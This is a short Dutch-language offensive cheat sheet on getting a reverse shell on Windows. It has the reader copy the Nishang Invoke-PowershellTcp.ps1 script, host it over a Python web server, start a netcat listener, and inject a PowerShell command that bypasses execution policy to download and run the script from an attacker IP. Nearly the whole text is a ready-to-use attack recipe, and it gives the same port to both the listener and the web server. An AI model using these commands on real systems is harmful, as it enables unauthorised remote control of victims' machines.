## Shell verkrijgen

### Basics

#### Payload kiezen voor de RCE

**Standaard**

```
/opt/nishang/Shells/Invoke-PowershellTcp.ps1
cp /opt/nishang/Shells/Invoke-PowershellTcp.ps1 /<workdirectory>/rev.ps1

## Verander de rev.ps1 naar je ip

cd /<workdirectory>/
python3 -m http.server 8088
nc -lvnp 8088
```

**Command Injection**

```
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://<ip>:8088/rev.ps1 -OutFile rev.ps1; .\rev.ps1"
```

**En nu heb je een stabiele shell in windows**

*Zie /opt/nishang/Shells voor meer powerscript shells!*
